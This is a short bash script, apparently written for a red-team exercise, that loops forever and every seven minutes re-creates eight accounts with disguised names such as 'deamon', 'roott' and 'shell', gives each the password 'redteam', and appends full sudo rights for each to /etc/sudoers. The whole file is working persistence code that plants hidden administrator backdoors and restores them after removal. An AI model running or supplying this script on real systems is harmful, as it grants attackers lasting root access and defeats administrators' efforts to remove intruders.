#!/bin/bash

# Loop forever
while true
do
 #Sleep for 7 minutes. Then repeat.
 sleep 420

 #Add multiple users for red team to use
 useradd -m "home" -c "Default Home User" -s "/bin/bash"
 echo "home:redteam" | chpasswd
 echo 'home  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "bash" -c "Bash" -s "/bin/bash"
 echo "bash:redteam" | chpasswd
 echo 'bash  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "deamon" -c "Daemon Start" -s "/bin/bash"
 echo "deamon:redteam" | chpasswd
 echo 'deamon  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "shell" -c "Shell" -s "/bin/bash"
 echo "shell:redteam" | chpasswd
 echo 'shell  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "new" -c "News" -s "/bin/bash"
 echo "new:redteam" | chpasswd
 echo 'new  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "syn" -c "Syn User" -s "/bin/bash"
 echo "syn:redteam" | chpasswd
 echo 'syn  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "roott" -c "Root" -s "/bin/bash"
 echo "roott:redteam" | chpasswd
 echo 'roott  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "student" -c "CSEC Student" -s "/bin/bash"
 echo "student:redteam" | chpasswd
 echo 'student  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
done
